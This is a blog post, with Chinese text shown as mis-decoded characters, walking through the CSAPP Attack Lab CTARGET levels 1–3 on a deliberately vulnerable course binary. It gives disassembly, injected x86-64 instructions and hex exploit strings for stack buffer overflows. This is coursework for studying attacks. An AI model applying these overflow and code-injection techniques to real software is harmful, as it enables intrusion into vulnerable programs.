<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"fuhy.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"hide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="é‡æ–°åšäº†ä¸€éCSAPPé‡Œçš„Attack Labï½">
<meta property="og:type" content="article">
<meta property="og:title" content="Attack Lab">
<meta property="og:url" content="https://fuhy.github.io/note-of-attack-lab/">
<meta property="og:site_name" content="Alfred&#39;s Blog">
<meta property="og:description" content="é‡æ–°åšäº†ä¸€éCSAPPé‡Œçš„Attack Labï½">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2017-07-04T20:41:02.000Z">
<meta property="article:modified_time" content="2022-08-08T08:37:40.892Z">
<meta property="article:author" content="Alfred Fu">
<meta property="article:tag" content="Note">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://fuhy.github.io/note-of-attack-lab/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Attack Lab | Alfred's Blog</title>
  
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-JGSH933PYM"></script>
    <script>
      if (CONFIG.hostname === location.hostname) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-JGSH933PYM');
      }
    </script>






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Alfred's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://fuhy.github.io/note-of-attack-lab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Alfred Fu">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Alfred's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Attack Lab
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2017-07-05 04:41:02" itemprop="dateCreated datePublished" datetime="2017-07-05T04:41:02+08:00">2017-07-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-08-08 16:37:40" itemprop="dateModified" datetime="2022-08-08T16:37:40+08:00">2022-08-08</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>é‡æ–°åšäº†ä¸€éCSAPPé‡Œçš„Attack Labï½</p>
<span id="more"></span>

<h1 id="CTARGET"><a href="#CTARGET" class="headerlink" title="CTARGET"></a>CTARGET</h1><blockquote>
<p>For the first three phases, your exploit strings will attack CTARGET. </p>
<p>This program is set up in a way that the stack positions will be consistent from one run to the next and so that data on the stack can be treated as executable code. These features make the program vulnerable to attacks where the exploit strings contain the byte encodings of executable code.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">	Gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>éœ€è¦è¾“å…¥ç‰¹å®šé•¿åº¦çš„å­—ç¬¦ä¸²è®©<code>getbuf()</code>åœ¨è¿”å›æ—¶å°†æ§åˆ¶æµè½¬ç§»åˆ°<code>touch1()</code></p>
<p>åç¼–è¯‘<code>getbuf</code>ï¼š</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(lldb) disas -n getbuf</span><br><span class="line">ctarget`getbuf:</span><br><span class="line">ctarget[0x4017a8] &lt;+0&gt;:  subq   <span class="variable">$0x28</span>, %rsp</span><br><span class="line">ctarget[0x4017ac] &lt;+4&gt;:  movq   %rsp, %rdi</span><br><span class="line">ctarget[0x4017af] &lt;+7&gt;:  callq  0x401a40                  ; Gets at support.c:163</span><br><span class="line">ctarget[0x4017b4] &lt;+12&gt;: movl   <span class="variable">$0x1</span>, %eax</span><br><span class="line">ctarget[0x4017b9] &lt;+17&gt;: addq   <span class="variable">$0x28</span>, %rsp</span><br><span class="line">ctarget[0x4017bd] &lt;+21&gt;: retq</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åœ¨æ ˆä¸Šåˆ†é…äº†0x28çš„ç©ºé—´ç»™Getsã€‚å› æ­¤åªéœ€è¦è¾“å…¥å¤§å°ä¸º0x28çš„Byteså°±å¯ä»¥è¾¾åˆ°retçš„åœ°å€ã€‚</p>
<blockquote>
<p>0x28å­—èŠ‚å³æ˜¯40å­—èŠ‚ğŸ™„ï¸</p>
</blockquote>
<p>åç¼–è¯‘<code>touch1</code>ï¼š</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(lldb) disas -n touch1</span><br><span class="line">ctarget`touch1:</span><br><span class="line">ctarget[0x4017c0] &lt;+0&gt;:  subq   <span class="variable">$0x8</span>, %rsp</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°touch1çš„åœ°å€<code>0x4017c0</code>. åœ¨x86-64ä¸Šå³ä¸º<code>c01740000000000</code>.</p>
<p>æ‰€ä»¥æ„å»ºçš„å­—ç¬¦ä¸²ä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><blockquote>
<p>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument. </p>
</blockquote>
<p>è¿™ä¸ªlabå‹ç¼©åŒ…é‡Œçš„cookieä¸º<code>0x59b997fa</code>.</p>
<p>ç°éœ€è¦å°†cookieä¼ é€’ç»™<code>touch2()</code>,</p>
<p>æ—¢æ˜¯è¦†ç›–æ‰<code>%rdi</code>ï¼ˆå­˜å‚¨ç¬¬ä¸€ä¸ªå‚æ•°çš„å¯„å­˜å™¨ï¼‰ä¸­çš„å€¼å¹¶è°ƒç”¨<code>touch2()</code>.</p>
<p>å¯é€šè¿‡ä»¥ä¸‹æ±‡ç¼–æŒ‡ä»¤è¾¾æˆ:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq cookie, %rdi  #å°†cookieçš„å€¼èµ‹ç»™%rdi</span><br><span class="line">push &amp;(touch2())   #å°†touch2()çš„åœ°å€å…¥æ ˆ</span><br><span class="line">ret                #ä»æ ˆä¸­å¼¹å‡ºè¿”å›åœ°å€å¹¶è½¬åˆ°æ­¤åœ°å€</span><br></pre></td></tr></table></figure>

<p>åæ±‡ç¼–<code>touch2()</code>ï¼š</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(lldb) disas -n touch2</span><br><span class="line">ctarget`touch2:</span><br><span class="line">ctarget[0x4017ec] &lt;+0&gt;:  subq   <span class="variable">$0x8</span>, %rsp</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°åœ°å€ä¸º<code>0x4017ec</code>.</p>
<p>å¡«å…¥å¾—åˆ°æ±‡ç¼–æŒ‡ä»¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">push $0x4017ec </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åˆ«å¿˜äº†ç«‹å³æ•°å‰çš„$, gccå¹¶ä¸ä¼šæŠ¥é”™ğŸ™„ï¸</p>
</blockquote>
<p>è°ƒç”¨æ±‡ç¼–å™¨(as)å¾—åˆ°å­—èŠ‚ç ï¼Œå†åæ±‡ç¼–:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c code.s</span><br><span class="line">$ objdump -d code.o</span><br></pre></td></tr></table></figure>

<p>æ˜¾ç¤ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./code.o:	file format Mach-O 64-bit x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section __TEXT,__text:</span><br><span class="line">__text:</span><br><span class="line">       0:	48 c7 c7 fa 97 b9 59 	movq	<span class="variable">$1505335290</span>, %rdi</span><br><span class="line">       7:	68 ec 17 40 00 	pushq	<span class="variable">$4200428</span></span><br><span class="line">       c:	c3 	retq</span><br></pre></td></tr></table></figure>

<p>å› æ­¤å¯ä»¥é€šè¿‡è¿™æ®µå­—èŠ‚ç å®Œæˆé¢˜ç›®æ‰€ç»™çš„è¦æ±‚ã€‚ä½†è¿˜éœ€è¦è®©æœºå™¨æ‰§è¡Œæ­¤æ®µä»£ç ï¼Œä»¿Level1ï¼Œå¯è®©<code>getbuf()</code>è¿”å›åˆ°æ­¤æ®µä»£ç çš„èµ·å§‹ä½ç½®(å³<code>buf[BUFFER_SIZE]</code>çš„èµ·å§‹ä½ç½®).</p>
<p>é€šè¿‡gdbè®¾ç½®æ–­ç‚¹æ¥æŸ¥çœ‹è°ƒç”¨Getsä¹‹å‰æ ˆæŒ‡é’ˆçš„ä½ç½®ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./ctarget</span><br><span class="line">(gdb) b *0x4017ac</span><br><span class="line">(gdb) run -q &lt;./code</span><br><span class="line">(gdb) info r</span><br><span class="line">(gdb) disas</span><br></pre></td></tr></table></figure>

<p>æœ¬æœºä¸Šè¿›å…¥<code>getbuf()</code>æ—¶<code>%rsp</code>çš„å€¼ä¸º<code>0x5561dc78</code>.</p>
<p>æ‰€ä»¥å¯ä»¥å¾—åˆ°å­—ç¬¦ä¸²ä¸º:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68 </span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>

<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><blockquote>
<p>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç±»ä¼¼å‰ä¸¤é¢˜ï¼ŒåŒæ ·æ˜¯ä¼ é€’å‚æ•°ç»™æ–°çš„å‡½æ•°ã€‚</p>
<p>ä¼ é€’çš„å­—ç¬¦ä¸²ä¸ºcookieï¼Œå³<code>0x59b997fa</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>

<p>å¯é€šè¿‡ä»¥ä¸‹æ±‡ç¼–æŒ‡ä»¤è¾¾æˆ:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq &amp;string, %rdi  #å°†å­—ç¬¦ä¸²åœ°å€çš„å€¼èµ‹ç»™%rdi</span><br><span class="line">pushq &amp;(touch3())    #å°†touch3()çš„åœ°å€å…¥æ ˆ</span><br><span class="line">ret                 #ä»æ ˆä¸­å¼¹å‡ºè¿”å›åœ°å€å¹¶è½¬åˆ°æ­¤åœ°å€</span><br></pre></td></tr></table></figure>

<p>åæ±‡ç¼–å¾—åˆ°<code>touch3()</code>çš„åœ°å€<code>0x4018fa</code>.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(lldb) disas -n touch3</span><br><span class="line">ctarget`touch3:</span><br><span class="line">ctarget[0x4018fa] &lt;+0&gt;:   pushq  %rbx</span><br><span class="line">ctarget[0x4018fb] &lt;+1&gt;:   movq   %rdi, %rbx</span><br></pre></td></tr></table></figure>

<p>åœ¨è°ƒç”¨<code>touch3()</code>çš„æ—¶å€™ï¼Œå‡½æ•°ä¼šç»§ç»­è°ƒç”¨<code>hexmatch()</code>ï¼Œå› æ­¤å¾—è€ƒè™‘å­—ç¬¦ä¸²ä¼šä¸ä¼šè¢«è¦†ç›–.</p>
<p>å¯ä»¥è€ƒè™‘æŠŠå­—ç¬¦å­˜è¿›test()çš„æ ˆå¸§ä¸­ï¼ˆåæ­£ä¹Ÿä¸ä¼šç”¨åˆ°äº†</p>
<table>
<thead>
<tr>
<th align="left">Address</th>
<th align="left">Stack</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0x5561dc78 + 0x28 +0x8</td>
<td align="left">ä¿å­˜test()å‡½æ•°çš„çŠ¶æ€</td>
</tr>
<tr>
<td align="left">0x5561dc78 + 0x28</td>
<td align="left">è¿”å›åœ°å€</td>
</tr>
<tr>
<td align="left">0x5561dc78</td>
<td align="left">getbufä¸­å¼€è¾Ÿçš„buffer[]æ•°ç»„</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">ä¿å­˜getbuf()å‡½æ•°çš„çŠ¶æ€</td>
</tr>
</tbody></table>
<blockquote>
<p>æ³¨æ„åˆ°æ ˆå‘ä½åœ°å€æ–¹å‘ç”Ÿé•¿</p>
</blockquote>
<p>ä»Level 2ä¸­å¾—åˆ°è°ƒç”¨Getsä¹‹å‰æ ˆæŒ‡é’ˆ<code>0x5561dc78</code>ï¼ŒåŠ ä¸Š48ä¸ªå­—èŠ‚åä¸º<code>0x5561dca8</code>ï¼Œå³ä¸ºæƒ³å­˜å‚¨çš„å­—ç¬¦ä¸²çš„åœ°å€ã€‚å› æ­¤è¾“å…¥çš„æ±‡ç¼–æŒ‡ä»¤åº”ä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi</span><br><span class="line">pushq $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æ„å»ºçš„è¾“å…¥æµåº”è¯¥é•¿è¿™æ ·:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68 </span><br><span class="line">fa 18 40 00 c3 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Note/" rel="tag"># Note</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item"></div>
      <div class="post-nav-item">
    <a href="/socket-web-programming/" rel="next" title="Socketç½‘ç»œç¼–ç¨‹">
      Socketç½‘ç»œç¼–ç¨‹ <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTARGET"><span class="nav-number">1.</span> <span class="nav-text">CTARGET</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-1"><span class="nav-number">1.1.</span> <span class="nav-text">Level 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-2"><span class="nav-number">1.2.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-3"><span class="nav-number">1.3.</span> <span class="nav-text">Level 3</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Alfred Fu</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">8</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/fuhy" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;fuhy" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/alfredhy" title="Weibo â†’ https:&#x2F;&#x2F;weibo.com&#x2F;alfredhy" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i></a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Alfred Fu</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
